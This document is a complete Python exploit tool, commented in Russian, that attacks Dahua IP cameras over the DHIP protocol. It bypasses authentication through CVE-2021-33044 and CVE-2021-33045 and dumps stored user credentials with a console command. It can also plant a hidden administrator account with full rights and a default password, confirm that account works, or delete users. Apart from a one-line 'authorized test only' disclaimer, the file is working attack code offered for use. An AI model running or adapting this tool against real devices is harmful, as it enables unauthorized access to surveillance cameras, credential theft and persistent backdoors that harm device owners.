#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dhip_onvifuser.py — DHIP-клиент поверх TCP (по умолчанию порт 1337),
который логинится на Dahua-устройство и выполняет `OnvifUser -u`,
вытаскивая таблицу пользователей.

Логин:
  1) CVE-2021-33044 — NetKeyboard bypass (session=0), отдаёт сессию без пароля;
  2) если не вышло — честный challenge (Web3.0) + hash-логин (clientType Console);
  3) fallback — CVE-2021-33045 loopback-plain (clientType Local / loginType Loopback).

Консоль: console.factory.instance -> console.attach (SID) -> console.runCmd.
Дампы приходят как notify-пакеты:

    {"method":"client.notifyConsoleResult",
     "params":{"info":{"Data":["строка", ...]}}}

Фрейм DHIP — 32-байтный заголовок + JSON.
Magic: 20 00 00 00 44 48 49 50 (первые 8 байт).
Поля LE uint32: [8:12]=session [12:16]=id [16:20]=pkgLen
                [20:24]=pkgIdx [24:28]=msgLen [28:32]=dataLen

Запуск:
    python dhip_onvifuser.py 192.0.2.10                 # порт 1337
    python dhip_onvifuser.py 192.0.2.10 -p 5000
    python dhip_onvifuser.py host -c "OnvifUser -l"     # другая команда
    python dhip_onvifuser.py host --json                # сырой вывод, без парсинга

Только для собственных устройств / авторизованного теста.
"""

import argparse
import binascii
import hashlib
import json
import socket
import struct
import sys
import time

DHIP_MAGIC = bytes([0x20, 0x00, 0x00, 0x00, 0x44, 0x48, 0x49, 0x50])
DEFAULT_PORT = 1337
READ_TIMEOUT = 15.0
DRAIN_TIMEOUT = 0.6


# ── фрейминг ─────────────────────────────────────────────────────────

def build_frame(sess, msg_id, method, params=None, obj=None, sid=None):
    body = {"method": method, "params": params, "id": msg_id, "session": sess}
    if obj is not None:
        body["object"] = obj
    if sid is not None:
        body["SID"] = sid
    raw = json.dumps(body, separators=(",", ":")).encode("utf-8")
    hdr = bytearray(32)
    hdr[0:8] = DHIP_MAGIC
    struct.pack_into("<I", hdr, 8, sess & 0xFFFFFFFF)
    struct.pack_into("<I", hdr, 12, msg_id & 0xFFFFFFFF)
    struct.pack_into("<I", hdr, 16, len(raw))
    struct.pack_into("<I", hdr, 24, len(raw))
    return bytes(hdr) + raw


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("соединение закрыто")
        buf += chunk
    return buf


def read_frame(sock):
    """Читает один DHIP-фрейм, переживая мусор до magic. -> (bytes body, bytes raw)."""
    win = b""
    raw = b""
    while True:
        b = sock.recv(1)
        if not b:
            raise ConnectionError("соединение закрыто при чтении фрейма")
        win = (win + b)[-32:]
        raw += b
        if len(win) >= 8 and win[-8:] == DHIP_MAGIC:
            raw = raw[:-8]
            rest = recv_exact(sock, 24)
            hdr = win[-8:] + rest
            body_len = struct.unpack_from("<I", hdr, 16)[0]
            if body_len > 4 * 1024 * 1024:
                raise ValueError("слишком большое тело DHIP: %d" % body_len)
            body = recv_exact(sock, body_len) if body_len else b""
            return body, raw


def call(sock, method, params, sess, msg_id, obj=None, sid=None, timeout=READ_TIMEOUT):
    """Отправить RPC, дождаться ответа с тем же id (notify пропускаем). -> (dict, list)."""
    sock.sendall(build_frame(sess, msg_id, method, params, obj, sid))
    sock.settimeout(timeout)
    notifies = []
    while True:
        body, raw = read_frame(sock)
        if raw:
            try:
                notifies.append(json.loads(raw.decode("utf-8", "replace")))
            except ValueError:
                pass
        try:
            pkt = json.loads(body.decode("utf-8", "replace"))
        except ValueError:
            continue
        if int(pkt.get("id", -1)) == msg_id:
            return pkt, notifies
        notifies.append(pkt)


def drain(sock, seconds=DRAIN_TIMEOUT):
    """Дособрать notify-дампы после runCmd (вывод приходит асинхронно)."""
    out = []
    end = time.time() + seconds
    while time.time() < end:
        sock.settimeout(0.3)
        try:
            body, raw = read_frame(sock)
        except (socket.timeout, ConnectionError, OSError):
            return out
        for blob in (raw, body):
            if not blob:
                continue
            try:
                out.append(json.loads(blob.decode("utf-8", "replace")))
            except ValueError:
                pass
    return out


# ── логин ────────────────────────────────────────────────────────────

def _md5upper(s):
    return hashlib.md5(s.encode("utf-8")).hexdigest().upper()


def _session_of(pkt):
    s = pkt.get("session", 0)
    if not s:
        p = pkt.get("params") or {}
        s = p.get("session", 0)
    return int(s or 0)


def _challenge(pkt):
    p = pkt.get("params") or {}
    return p.get("realm", ""), p.get("random", "")


def login_bypass_33044(sock):
    """CVE-2021-33044: NetKeyboard/Direct/session=0. -> (session, pkt) или (0, pkt)."""
    pkt, _ = call(sock, "global.login", {
        "userName": "admin",
        "password": "Not Used",
        "clientType": "NetKeyboard",
        "loginType": "Direct",
        "authorityType": "Default",
        "passwordType": "Default",
    }, 0, 1)
    if pkt.get("result") is True:
        s = _session_of(pkt)
        if s:
            return s, pkt
    return 0, pkt


def login_challenge(sock, pkt, password, user="admin"):
    """Честный challenge: Web3.0 выдаёт realm/random -> hash-логин Console."""
    realm, random = _challenge(pkt)
    if not realm or not random:
        # второй Web3.0, чтобы выбить challenge
        pkt, _ = call(sock, "global.login", {
            "userName": user, "password": "",
            "clientType": "Web3.0", "loginType": "Direct",
        }, 0, 1)
        realm, random = _challenge(pkt)
    if not realm or not random:
        return 0
    ch_sess = _session_of(pkt)
    h1 = _md5upper("%s:%s:%s" % (user, realm, password))
    h2 = _md5upper("%s:%s:%s" % (user, random, h1))
    r, _ = call(sock, "global.login", {
        "userName": user, "password": h2,
        "clientType": "Console", "loginType": "Direct",
        "ipAddr": "127.0.0.1", "passwordType": "Default",
        "authorityType": "Default",
    }, ch_sess, 2)
    if r.get("result") is True:
        return _session_of(r)
    # CVE-2021-33045 — loopback с открытым паролем
    r, _ = call(sock, "global.login", {
        "userName": user, "password": password,
        "clientType": "Local", "loginType": "Loopback",
        "ipAddr": "127.0.0.1", "passwordType": "Plain",
        "authorityType": "Default",
    }, ch_sess, 3)
    if r.get("result") is True:
        return _session_of(r)
    return 0


def login(sock, password=None, verbose=True):
    """Возвращает session или 0.
    password задан -> Честный Console-логин (полные права, write) ПЕРВЫМ.
    password=None -> 33044 bypass первым (только чтение на части fw), потом дефолты."""
    # С известным паролем идём честным challenge первым: bypass-сессия
    # на многих прошивках read-only (addUser эхо-OK без записи).
    if password is not None:
        if verbose:
            print("[*] логин с паролем: честный challenge (полные права)")
        pkt, _ = call(sock, "global.login",
                      {"userName": "admin", "password": "",
                       "clientType": "Web3.0", "loginType": "Direct"}, 0, 1)
        s = login_challenge(sock, pkt, password or "")
        if s:
            if verbose:
                print("[+] Console-логин ок, сессия %d" % s)
            return s
        if verbose:
            print("[*] честный логин не удался — фоллбек на 33044 bypass")

    sess, pkt = login_bypass_33044(sock)
    if sess:
        if verbose:
            print("[+] CVE-2021-33044 bypass: сессия %d (без пароля)" % sess)
        return sess

    if verbose:
        print("[*] bypass не прошёл — пробуем challenge/hash-логин")
    for pwd in [""] if password is not None else ["", "admin"]:
        s = login_challenge(sock, pkt, pwd or "")
        if s:
            if verbose:
                print("[+] логин %) удался, сессия %d" % (("с паролем" if pwd else "с пустым паролем"), s))
            return s
    return 0


# ── консоль ──────────────────────────────────────────────────────────

def notify_data(pkt):
    """Вытащить params.info.Data (список строк) из notify-пакета."""
    params = pkt.get("params") or {}
    info = params.get("info") or {}
    data = info.get("Data") or []
    if isinstance(data, list):
        return "".join(x for x in data if isinstance(x, str))
    if isinstance(data, str):
        return data
    return ""


def run_console_cmd(sock, sess, command, verbose=True):
    """factory.instance -> attach(SID) -> runCmd -> drain. -> сырой текст."""
    inst, _ = call(sock, "console.factory.instance", None, sess, 4)
    obj = inst.get("result")
    if obj is None:
        raise RuntimeError("console.factory.instance не вернул result")

    sid = None
    try:
        att, _ = call(sock, "console.attach", {"proc": obj}, sess, 8, obj)
        sid = (att.get("params") or {}).get("SID")
    except Exception as e:
        if verbose:
            print("[!] console.attach: %s" % e)

    chunks = []
    # runCmd — с объектом, при ошибке — без него (как в Go-реализации)
    for use_obj in (True, False):
        try:
            ack, notes = call(sock, "console.runCmd", {"command": command},
                              sess, 6, obj if use_obj else None, sid)
        except Exception as e:
            if verbose:
                print("[!] console.runCmd: %s" % e)
            continue
        for n in notes:
            chunks.append(notify_data(n))
        more = drain(sock)
        for n in more:
            chunks.append(notify_data(n))
        if ack.get("result") is True and any(chunks):
            break
    return "".join(chunks)


def extract_users(text):
    """Сбалансированные {...} с полями Name/Password — как в Go-версии."""
    users = []
    i = 0
    while i < len(text):
        if text[i] != "{":
            i += 1
            continue
        depth = 0
        for j in range(i, len(text)):
            if text[j] == "{":
                depth += 1
            elif text[j] == "}":
                depth -= 1
            if depth == 0:
                frag = text[i:j + 1]
                obj = None
                try:
                    obj = json.loads(frag)
                except ValueError:
                    try:
                        obj = json.loads(json.loads('"%s"' % frag.replace('"', '\\"')))
                    except ValueError:
                        obj = None
                if isinstance(obj, dict) and obj.get("Name") and obj.get("Password"):
                    users.append(obj)
                i = j
                break
        i += 1
    return users


# ── добавление юзера ─────────────────────────────────────────────────

# стандартный набор прав администратора Dahua (как DefaultAuthorityList33045)
DEFAULT_AUTH_LIST = [
    "AuthUserMag", "Monitor_01", "Replay_01", "AuthSysCfg", "AuthSysInfo",
    "AuthManuCtr", "AuthBackup", "AuthStoreCfg", "AuthEventCfg", "AuthNetCfg",
    "AuthPeripheral", "AuthAVParam", "AuthSecurity", "AuthMaintence",
]
SHORT_AUTH_LIST = ["Config", "Info", "Monitor_01", "Playback_01"]


def _md5upper(s):
    return hashlib.md5(s.encode("utf-8")).hexdigest().upper()


def _fetch_auth_list(sock, sess):
    """userManager.getAuthorityList — если камера отдаёт свой список прав."""
    try:
        r, _ = call(sock, "userManager.getAuthorityList", {}, sess, 4)
    except Exception:
        return None
    if r.get("result") is not True:
        return None
    params = r.get("params")
    if isinstance(params, list) and params and all(isinstance(x, str) for x in params):
        return params
    return None


def _user_obj(login, pwd, enc, auth_list):
    return {
        "Name": login,
        "Password": pwd,
        "Group": "admin",
        "AuthorityList": auth_list,
        "Sharable": True,
        "Reserved": False,
        "Encryption": enc,          # "Default" (hash) | "Plain"
        "Type": "Normal",
        "Memo": "krushitel",
        "MacOnly": "",
        "MaxMonitorChannels": 0,
    }


def _try_add(sock, sess, login, pwd, enc, auth_list, msg_id):
    try:
        r, _ = call(sock, "userManager.addUser", {"user": _user_obj(login, pwd, enc, auth_list)},
                    sess, msg_id)
    except Exception as e:
        print("[!] addUser (%s): %s" % (enc, e))
        return False
    return r.get("result") is True


def add_user(sock, sess, login, password, verbose=True):
    """userManager.addUser: полный и короткий AuthorityList x Default/Plain,
    затем delete+retry если юзер уже есть. Возврат — bool."""
    auth_list = _fetch_auth_list(sock, sess) or DEFAULT_AUTH_LIST
    lists = [auth_list, SHORT_AUTH_LIST]

    msg_id = 10
    for lst in lists:
        msg_id += 1
        if _try_add(sock, sess, login, password, "Plain", lst, msg_id):
            return True
        if verbose:
            print("[*] addUser Plain не прошёл (list len=%d), пробую Default" % len(lst))
        msg_id += 1
        # Default требует хеш пароля от realm — для NetKeyboard-сессии realm
        # может быть пустым, тогда Default пропускаем (камера сама вернёт ошибку).
        pwd_hash = _md5upper("%s:%s:%s" % (login, "", password))
        if _try_add(sock, sess, login, pwd_hash, "Default", lst, msg_id):
            return True

    # юзер мог уже существовать (повторный прогон) — удалить и заново
    if verbose:
        print("[*] delete+retry: возможно юзер уже есть")
    try:
        call(sock, "userManager.deleteUser", {"name": login}, sess, msg_id + 1)
    except Exception:
        pass
    msg_id += 2
    for lst in lists:
        msg_id += 1
        if _try_add(sock, sess, login, password, "Plain", lst, msg_id):
            return True
    return False


def _verify_once(sock, login, password):
    """Одна попытка логина новым юзером на свежем сокете.
    Порядок: plain Direct (Console) → Web3.0 challenge + hash → loopback.
    Возврат: (ok, диагностика) — диагностика для понятного лога."""
    # 1) прямой plain-логин Console: некоторые fw принимают сразу
    try:
        r, _ = call(sock, "global.login",
                    {"userName": login, "password": password,
                     "clientType": "Console", "loginType": "Direct",
                     "ipAddr": "127.0.0.1", "passwordType": "Plain",
                     "authorityType": "Default"}, 0, 90)
        if r.get("result") is True and _session_of(r) != 0:
            return True, "plain Console"
    except Exception:
        pass

    # 2) Web3.0 challenge → hash Console
    try:
        r, _ = call(sock, "global.login",
                    {"userName": login, "password": "",
                     "clientType": "Web3.0", "loginType": "Direct"}, 0, 91)
    except Exception:
        return False, "нет challenge"
    realm, random = _challenge(r)
    if realm and random:
        ch_sess = _session_of(r)
        h1 = _md5upper("%s:%s:%s" % (login, realm, password))
        h2 = _md5upper("%s:%s:%s" % (login, random, h1))
        for enc, pwd in (("Default", h2), ("Plain", password)):
            try:
                r2, _ = call(sock, "global.login",
                             {"userName": login, "password": pwd,
                              "clientType": "Console", "loginType": "Direct",
                              "ipAddr": "127.0.0.1", "passwordType": enc,
                              "authorityType": "Default"}, ch_sess, 92)
            except Exception:
                continue
            if r2.get("result") is True and _session_of(r2) != 0:
                return True, "challenge hash (%s)" % enc

    # 3) loopback-plain (CVE-2021-33045)
    try:
        r3, _ = call(sock, "global.login",
                     {"userName": login, "password": password,
                      "clientType": "Local", "loginType": "Loopback",
                      "ipAddr": "127.0.0.1", "passwordType": "Plain",
                      "authorityType": "Default"}, 0, 93)
        if r3.get("result") is True and _session_of(r3) != 0:
            return True, "loopback"
    except Exception:
        pass
    return False, "отказ камеры"


def verify_login(host, port, login, password, tries=5, delay=3.0, verbose=True):
    """Проверка новым юзером на СВЕЖЕМ коннекте, с ретраями и паузой:
    после addUser Dahua применяет таблицу юзеров не мгновенно."""
    last = ""
    for i in range(tries):
        if i:
            time.sleep(delay)
        try:
            s = socket.create_connection((host, port), timeout=READ_TIMEOUT)
        except OSError as e:
            last = "connect: %s" % e
            continue
        s.settimeout(READ_TIMEOUT)
        try:
            ok, diag = _verify_once(s, login, password)
        finally:
            s.close()
        if ok:
            if verbose:
                print("[*] верификация прошла (%s), попытка %d" % (diag, i + 1))
            return True
        last = diag
        if verbose:
            print("[*] верификация попытка %d/%d: %s" % (i + 1, tries, diag))
    if verbose:
        print("[*] последний ответ: %s" % last)
    return False


# ── main ─────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="Dahua DHIP tool: читать юзеров (OnvifUser -u) или добавить юзера (CVE-2021-33044)")
    ap.add_argument("host", help="IP или хост устройства")
    ap.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                    help="порт DHIP (по умолчанию %d)" % DEFAULT_PORT)
    ap.add_argument("-P", "--password", default=None,
                    help="пароль admin для честного challenge-логина (если bypass не сработал)")

    mode = ap.add_mutually_exclusive_group()
    mode.add_argument("-c", "--command", default=None,
                      help="команда консоли (по умолчанию 'OnvifUser -u')")
    mode.add_argument("--add", action="store_true",
                      help="добавить юзера через userManager.addUser (см. --login/--pass)")
    mode.add_argument("--del", dest="do_delete", action="store_true",
                      help="удалить юзера через userManager.deleteUser (см. --login)")

    ap.add_argument("--login", default="test", help="логин нового юзера (режим --add)")
    ap.add_argument("--pass", dest="newpass", default="1337admin1337",
                    help="пароль нового юзера (режим --add)")
    ap.add_argument("--verify-tries", type=int, default=5,
                    help="сколько раз пробовать верификацию (по умолчанию 5, с паузой 3с)")
    ap.add_argument("--json", action="store_true", help="сырой вывод без парсинга")
    ap.add_argument("-t", "--timeout", type=float, default=6.0, help="таймаут коннекта, сек")
    args = ap.parse_args()

    # Каждый шаг — на СВОЁМ свежем коннекте. Dahua рвёт сокет при попытке
    # честного challenge-логина, если на нём уже была bypass-сессия; плюс
    # write-права (addUser) бывают только у честной Console-сессии.
    def fresh_session(with_password):
        s = socket.create_connection((args.host, args.port), timeout=args.timeout)
        s.settimeout(READ_TIMEOUT)
        try:
            sess_ = login(s, with_password)
        except Exception as e:
            print("[-] login: %s" % e, file=sys.stderr)
            s.close()
            return None, 0
        if not sess_:
            s.close()
            return None, 0
        return s, sess_

    if args.add:
        print("[*] добавляю юзера %s:%s …" % (args.login, args.newpass))
        sock, sess = fresh_session(args.password)
        if sock is None:
            print("[-] логин не удался (устройство, похоже, патчено)", file=sys.stderr)
            return 2
        try:
            # явно пробуем write-операцию; read-only bypass сюда не годится
            if args.password is None:
                print("[!] пароль admin не задан (-P): bypass-сессия может быть read-only")
            ok = add_user(sock, sess, args.login, args.newpass)
        finally:
            sock.close()
        if not ok:
            print("[-] addUser не удался (нет прав / патчено / юзер уже есть)", file=sys.stderr)
            return 4
        print("[+] addUser вернул OK")
        time.sleep(2.0)  # камера применяет таблицу не мгновенно
        if verify_login(args.host, args.port, args.login, args.newpass,
                        tries=getattr(args, "verify_tries", 5)):
            print("[+] верификация: логин %s:%s подтверждён" % (args.login, args.newpass))
            return 0
        print("[!] addUser OK, но логин новым юзером не подтвердился "
              "(юзер, вероятно, создан — проверь OnvifUser -u)", file=sys.stderr)
        return 5

    if args.do_delete:
        print("[*] удаляю юзера %s …" % args.login)
        sock, sess = fresh_session(args.password)
        if sock is None:
            print("[-] логин не удался", file=sys.stderr)
            return 2
        try:
            r, _ = call(sock, "userManager.deleteUser", {"name": args.login}, sess, 20)
        except Exception as e:
            sock.close()
            print("[-] deleteUser: %s" % e, file=sys.stderr)
            return 6
        sock.close()
        if r.get("result") is True:
            print("[+] deleteUser вернул OK: %s удалён" % args.login)
            return 0
        print("[-] deleteUser не прошёл: %r" % r.get("result"), file=sys.stderr)
        return 6

    # read-режим: OnvifUser -u
    sock, sess = fresh_session(args.password)
    if sock is None:
        print("[-] логин не удался (устройство, похоже, патчено)", file=sys.stderr)
        return 2
    try:
        cmd = args.command or "OnvifUser -u"
        out = run_console_cmd(sock, sess, cmd)
    except Exception as e:
        sock.close()
        print("[-] console: %s" % e, file=sys.stderr)
        return 3
    sock.close()

    if args.json:
        print(out)
        return 0

    users = extract_users(out)
    if users:
        print("=" * 60)
        for u in sorted(users, key=lambda x: str(x.get("Name"))):
            print("  %-16s : %-24s  [%s]" % (
                u.get("Name", "?"), u.get("Password", "?"), u.get("Group", "")))
        print("=" * 60)
        print("[+] юзеров: %d" % len(users))
    else:
        print("[*] структурированных записей нет, сырой вывод:")
        print(out.strip() or "(пусто)")

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
